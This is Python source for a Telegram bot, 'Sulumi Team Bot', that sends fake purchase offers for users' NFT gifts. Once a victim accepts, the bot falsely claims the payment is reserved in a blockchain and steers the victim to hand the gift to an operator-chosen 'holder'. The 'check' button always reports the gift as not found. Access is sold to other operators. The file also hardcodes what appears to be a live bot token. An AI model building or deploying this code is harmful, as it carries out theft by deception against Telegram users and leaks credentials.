"""
Sulumi Team Bot — Final Render Version
"""

import os
import re
import uuid
import time
import requests
from collections import deque
from flask import Flask, request, jsonify

app = Flask(__name__)

# ==================== КОНФИГ ====================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "9021246143:AAF0SsyX81BAHC-myqxc2vN00JcFPGpgKhk")
OWNER_ID = int(os.environ.get("OWNER_ID", "7092015279"))
PAYMENT = os.environ.get("PAYMENT", "golda11123")
API = f"https://api.telegram.org/bot{BOT_TOKEN}"
RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://sulumi-bot.onrender.com")

# ==================== CUSTOM EMOJI ID ====================
CUSTOM_EMOJI = {
    "stars": "5958376256788502078",
    "grams": "6006074913742396956",
    "decline": "5778527486270770928",
    "accept": "5776375003280838798",
    "forward": "5832251986635920010",
    "check": "6019523512908124649"
}

# ==================== PREMIUM EMOJI HELPER ====================
def ce(name, fallback):
    return f'<tg-emoji emoji-id="{CUSTOM_EMOJI[name]}">{fallback}</tg-emoji>'

# ==================== ХРАНИЛИЩА ====================
deals = {}
users = {}
bconns = {}
allowed = [OWNER_ID]
wholder = set()
awgrant = {}
rlog = deque()
rwait = 0

ALLOWED_UPDATES = ["message", "callback_query", "business_connection", "business_message"]

# ==================== API ====================
def api(method, **p):
    global rwait
    now = time.time()
    if rwait > 0:
        time.sleep(rwait)
        rwait = 0
        rlog.clear()
    while rlog and rlog[0] < now - 1:
        rlog.popleft()
    if len(rlog) >= 25:
        time.sleep(1.0 - (now - rlog[0]))
    rlog.append(time.time())
    try:
        r = requests.post(API + "/" + method, json=p, timeout=60)
        d = r.json()
        if not d.get("ok") and d.get("error_code") == 429:
            rwait = d.get("parameters", {}).get("retry_after", 5)
            return api(method, **p)
        return d
    except Exception as e:
        print("ERR:", e)
        return {}

def fmt(n):
    return f"{int(n):,}".replace(",", " ")

def gs(uid):
    if uid not in users:
        users[uid] = {"lang": "ru", "cur": "stars", "hold": PAYMENT}
    return users[uid]

def sm(cid, txt, kb=None, bci=None):
    d = {"chat_id": cid, "text": txt, "parse_mode": "HTML"}
    if kb: d["reply_markup"] = kb
    if bci: d["business_connection_id"] = bci
    return api("sendMessage", **d)

def sm_nft(cid, txt, nft_url, kb=None, bci=None):
    d = {
        "chat_id": cid,
        "text": txt,
        "parse_mode": "HTML",
        "link_preview_options": {
            "is_disabled": False,
            "show_above_text": True,
            "url": nft_url
        }
    }
    if kb: d["reply_markup"] = kb
    if bci: d["business_connection_id"] = bci
    return api("sendMessage", **d)

def em_nft(cid, mid, txt, nft_url, kb=None, bci=None):
    d = {
        "chat_id": cid,
        "message_id": mid,
        "text": txt,
        "parse_mode": "HTML",
        "link_preview_options": {
            "is_disabled": False,
            "show_above_text": True,
            "url": nft_url
        }
    }
    if kb: d["reply_markup"] = kb
    if bci: d["business_connection_id"] = bci
    return api("editMessageText", **d)

def em(cid, mid, txt, kb=None, bci=None):
    d = {"chat_id": cid, "message_id": mid, "text": txt, "parse_mode": "HTML"}
    if kb: d["reply_markup"] = kb
    if bci: d["business_connection_id"] = bci
    return api("editMessageText", **d)

def dm(cid, mid, bci=None):
    d = {"chat_id": cid, "message_id": mid}
    if bci: d["business_connection_id"] = bci
    return api("deleteMessage", **d)

def ac(cb, txt=None, sa=False):
    d = {"callback_query_id": cb, "show_alert": sa}
    if txt: d["text"] = txt
    return api("answerCallbackQuery", **d)

# ==================== КЛАВИАТУРЫ ====================
def okb(did):
    kb = {
        "inline_keyboard": [
            [
                {
                    "text": " Отклонить",
                    "callback_data": f"decline:{did}",
                    "custom_emoji_id": str(CUSTOM_EMOJI["decline"])
                },
                {
                    "text": "✓ Принять",
                    "callback_data": f"accept:{did}",
                    "custom_emoji_id": str(CUSTOM_EMOJI["accept"])
                }
            ]
        ]
    }
    return kb

def aakb(did, h):
    clean_h = h.lstrip('@')
    gift_link = f"tg://send_gift?to={clean_h}"
    
    kb = {
        "inline_keyboard": [
            [
                {
                    "text": "↗ Передать",
                    "url": gift_link,
                    "custom_emoji_id": str(CUSTOM_EMOJI["forward"])
                }
            ],
            [
                {
                    "text": "✓ Проверить",
                    "callback_data": f"check:{did}",
                    "custom_emoji_id": str(CUSTOM_EMOJI["check"])
                }
            ]
        ]
    }
    return kb

def amenu():
    return {"inline_keyboard": [[{"text": "📋 Список доступов", "callback_data": "admin_list"}]]}

# ==================== ПАРСЕР ====================
def pnft(t):
    m = re.search(r'(?:https?://)?(?:t\.me/nft/)?([A-Za-z0-9]+-\d+)', t, re.I)
    if not m: return None
    s = m.group(1)
    np2, num = s.rsplit("-", 1)
    gn = re.sub(r'([a-z])([A-Z])', r'\1 \2', np2)
    return {"slug": s, "name": gn, "num": num, "nfmt": fmt(num)}

def goname(msg):
    u = msg['from'].get('username')
    f = msg['from'].get('first_name')
    return "@" + u if u else (f if f else "who?")

# ==================== ОБРАБОТЧИКИ ====================
def handle_message(msg):
    cid = msg["chat"]["id"]
    uid = msg["from"]["id"]
    ci = msg.get("business_connection_id")

    if ci:
        bconns[cid] = ci
        bconns[uid] = ci

    txt = (msg.get("text") or "").strip()

    if txt.startswith("/") and uid not in allowed:
        sm(cid, f"🔒 <b>Доступ закрыт</b>\n\n💰 <b>@{PAYMENT}</b>", bci=ci)
        return

    if not txt.startswith("/"): return

    if txt == "/start":
        cmd_text = f"""✨ <b>Sulumi Team Bot</b>

📋 <b>Команды:</b>
/send — Создать оффер
/settings — Настройки
/profile — Профиль
/stats — Статистика
/help — Помощь"""
        if uid == OWNER_ID:
            cmd_text += "\n\n🔐 <b>Админ:</b>\n/give ID — Выдать доступ\n/revoke ID — Забрать доступ\n/list — Список"
        sm(cid, cmd_text, bci=ci)
        return

    if txt.startswith("/send"):
        parts = txt.split()
        if len(parts) < 4:
            sm(cid, "❌ <b>Формат:</b>\n<code>/send ID ссылка цена</code>\n\nПример:\n<code>/send 123456789 https://t.me/nft/JellyBunny-98909 22000</code>", bci=ci)
            return

        try:
            tid = int(parts[1])
        except:
            sm(cid, "❌ ID должен быть числом", bci=ci)
            return

        ni = pnft(" ".join(parts[2:]))
        if not ni:
            sm(cid, "❌ Не найдена ссылка на NFT", bci=ci)
            return

        rest = " ".join(parts[2:]).replace("https://t.me/nft/" + ni["slug"], "").replace("t.me/nft/" + ni["slug"], "").strip()
        ps = rest.split()
        pr = None
        if ps:
            try: pr = int(ps[0])
            except: pass

        if pr is None:
            sm(cid, "❌ Не указана цена", bci=ci)
            return

        s = gs(uid)
        cs = ce("stars", "⭐") if s["cur"] == "stars" else ce("grams", "💎")
        did = str(uuid.uuid4())[:8]
        send_ci = bconns.get(uid) or bconns.get(OWNER_ID)

        deals[did] = {
            "wid": uid, "lid": tid, "slug": ni["slug"], "name": ni["name"],
            "num": ni["num"], "price": pr, "cur": s["cur"], "hold": s["hold"], 
            "st": "pending", "bci": send_ci
        }

        on = goname(msg)
        nl = "https://t.me/nft/" + ni["slug"]

        hidden = '<a href="' + nl + '">\u200b</a>'
        caption = hidden + f"Пользователь <u>{on}</u> готов отдать <b>{pr}</b> {cs}\nза ваш подарок <b>{ni['name']} #{ni['nfmt']}</b>\n\nУ вас есть <b>5h 59m</b>, чтобы принять решение."

        result = sm_nft(tid, caption, nl, kb=okb(did), bci=send_ci)
        if result.get("ok"):
            sm(cid, "✅ Оффер отправлен", bci=ci)
        else:
            sm(cid, f"❌ Ошибка: {result.get('description', 'err')}", bci=ci)
        return

    if txt == "/settings":
        s = gs(uid)
        lt = "🇷🇺 Русский" if s["lang"] == "ru" else "🇬🇧 English"
        ct = f"{ce('stars', '⭐')} Звёзды" if s["cur"] == "stars" else f"{ce('grams', '💎')} Грамы"
        sm(cid, f"""⚙️ <b>Настройки</b>\n\n🌐 Язык: {lt}\n💱 Валюта: {ct}\n👑 Держатель: @{s['hold']}\n\n<b>Изменение:</b>\n/lang ru|en\n/currency stars|grams\n/holder username""", bci=ci)
        return

    if txt == "/profile":
        s = gs(uid)
        cur_emoji = ce('stars', '⭐') if s['cur'] == 'stars' else ce('grams', '💎')
        sm(cid, f"""👤 <b>Профиль</b>\n\n🆔 ID: <code>{uid}</code>\n💱 Валюта: {cur_emoji}\n👑 Держатель: @{s['hold']}""", bci=ci)
        return

    if txt == "/stats":
        tot = len(deals)
        acc = sum(1 for d in deals.values() if d["st"] == "accepted")
        dec = sum(1 for d in deals.values() if d["st"] == "declined")
        pend = sum(1 for d in deals.values() if d["st"] == "pending")
        sm(cid, f"""📊 <b>Статистика</b>\n\n📈 Всего: {tot}\n✅ Принято: {acc}\n❌ Отклонено: {dec}\n⏳ Ожидает: {pend}""", bci=ci)
        return

    if txt == "/help":
        sm(cid, "❓ <b>Помощь</b>\n\n/send ID ссылка цена\nПример: /send 123456789 https://t.me/nft/JellyBunny-98909 22000", bci=ci)
        return

    if txt.startswith("/give"):
        if uid != OWNER_ID: return
        parts = txt.split()
        if len(parts) < 2:
            sm(cid, "❌ <b>Формат:</b>\n<code>/give ID</code> или <code>/give @username</code>", bci=ci)
            return
        arg = parts[1]
        ti = None
        try: ti = int(arg)
        except:
            un = arg.lstrip("@").lower()
            if un and " " not in un:
                res = api("getChat", chat_id="@" + un)
                if res.get("ok"): ti = res["result"]["id"]
        if ti:
            if ti not in allowed: allowed.append(ti)
            sm(cid, f"✅ <code>{ti}</code> — доступ выдан", bci=ci)
        else:
            sm(cid, "❌ Не найден пользователь", bci=ci)
        return

    if txt.startswith("/revoke"):
        if uid != OWNER_ID: return
        parts = txt.split()
        if len(parts) < 2:
            sm(cid, "❌ <b>Формат:</b>\n<code>/revoke ID</code> или <code>/revoke @username</code>", bci=ci)
            return
        arg = parts[1]
        ti = None
        try: ti = int(arg)
        except:
            un = arg.lstrip("@").lower()
            if un and " " not in un:
                res = api("getChat", chat_id="@" + un)
                if res.get("ok"): ti = res["result"]["id"]
        if ti:
            if ti in allowed and ti != OWNER_ID: allowed.remove(ti)
            sm(cid, f"🚫 <code>{ti}</code> — доступ отозван", bci=ci)
        else:
            sm(cid, "❌ Не найден", bci=ci)
        return

    if txt == "/list" and uid == OWNER_ID:
        ul = "\n".join([f"• <code>{u}</code>" for u in allowed])
        sm(cid, f"📋 <b>Доступы</b> ({len(allowed)}):\n\n{ul}", amenu(), bci=ci)
        return

    if txt.startswith("/lang"):
        lang = txt.replace("/lang", "").strip()
        if lang in ["ru", "en"]:
            gs(uid)["lang"] = lang
            sm(cid, f"✅ {lang}", bci=ci)
        return

    if txt.startswith("/currency"):
        cur = txt.replace("/currency", "").strip()
        if cur in ["stars", "grams"]:
            gs(uid)["cur"] = cur
            sm(cid, f"✅ {cur}", bci=ci)
        return

    if txt.startswith("/holder"):
        wholder.add(uid)
        sm(cid, "👑 Username без @", bci=ci)
        return

    if uid in wholder:
        un = txt.lstrip("@").lower()
        if un and " " not in un:
            gs(uid)["hold"] = un
            wholder.discard(uid)
            sm(cid, f"✅ @{un}", bci=ci)
        else:
            sm(cid, "❌", bci=ci)
        return

def handle_callback(cb):
    cbid = cb["id"]
    uid = cb["from"]["id"]
    msg = cb.get("message") or {}
    cid = msg.get("chat", {}).get("id", uid)
    mid = msg.get("message_id", 0)
    data = cb.get("data", "")
    ci = msg.get("business_connection_id") or bconns.get(cid)

    if data.startswith("check:"):
        ac(cbid, txt="🔍 Подарок пока не найден.", sa=True)
        return

    ac(cbid)

    if data.startswith("accept:"):
        did = data.split(":")[1]
        deal = deals.get(did)
        if not deal or deal["st"] != "pending": return

        deal["st"] = "accepted"
        cs = ce("stars", "⭐") if deal["cur"] == "stars" else ce("grams", "💎")
        nf = fmt(deal["num"])
        h = deal["hold"]
        nl = "https://t.me/nft/" + deal["slug"]
        deal_ci = deal.get("bci") or ci

        hidden = '<a href="' + nl + '">\u200b</a>'
        txt = hidden + f"<b>{deal['price']}</b> {cs} успешно зарезервированы в блокчейне.\n\n"
        txt += f"Ожидается передача подарка <b>{deal['name']} #{nf}</b> пользователю @{h}.\n\n"
        txt += f"Нажмите кнопку «Передать» и отправьте подарок <b>{deal['name']} #{nf}</b> пользователю <b>@{h}</b>. После завершения сделки {cs} автоматически начислятся на ваш аккаунт."

        result = em_nft(cid, mid, txt, nl, kb=aakb(did, h), bci=deal_ci)

        if not result.get("ok"):
            print("Edit error:", result.get("description"))
            dm(cid, mid, bci=deal_ci)
            sm_nft(cid, txt, nl, kb=aakb(did, h), bci=deal_ci)
        return

    if data.startswith("decline:"):
        did = data.split(":")[1]
        deal = deals.get(did)
        deal_ci = ci
        if deal:
            deal["st"] = "declined"
            deal_ci = deal.get("bci") or ci
        em(cid, mid, "❌ Оффер отклонён.", bci=deal_ci)
        return

    if uid != OWNER_ID: return

    if data == "admin_list":
        ul = "\n".join([f"• <code>{u}</code>" for u in allowed])
        sm(cid, f"📋 ({len(allowed)}):\n{ul}", amenu(), bci=ci)
        return

# ==================== WEBHOOK ====================
@app.route("/webhook", methods=["POST"])
def webhook():
    update = request.json
    try:
        if "message" in update: handle_message(update["message"])
        elif "callback_query" in update: handle_callback(update["callback_query"])
        elif "business_message" in update: handle_message(update["business_message"])
        elif "business_connection" in update:
            bc = update["business_connection"]
            bconns[bc["user"]["id"]] = bc["id"]
    except Exception as e:
        print("Webhook error:", e)
    return jsonify({"ok": True})

@app.route("/")
def index():
    return "✅ Sulumi Team Bot is running"

def set_webhook():
    url = f"{RENDER_URL}/webhook"
    result = api("setWebhook", url=url, allowed_updates=ALLOWED_UPDATES)
    if result.get("ok"):
        print(f"✅ Webhook set: {url}")
    else:
        print("❌ Webhook error:", result.get("description"))

def set_commands():
    commands = [
        {"command": "start", "description": "📋 Меню команд"},
        {"command": "send", "description": "💎 Создать оффер"},
        {"command": "settings", "description": "⚙️ Настройки"},
        {"command": "profile", "description": "👤 Профиль"},
        {"command": "stats", "description": "📊 Статистика"},
        {"command": "help", "description": "❓ Помощь"},
        {"command": "give", "description": "🔑 Выдать доступ"},
        {"command": "revoke", "description": "🚫 Забрать доступ"},
        {"command": "list", "description": "📋 Список"}
    ]
    api("setMyCommands", commands=commands)
    print("✅ Команды установлены")

if __name__ == "__main__":
    set_webhook()
    set_commands()
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
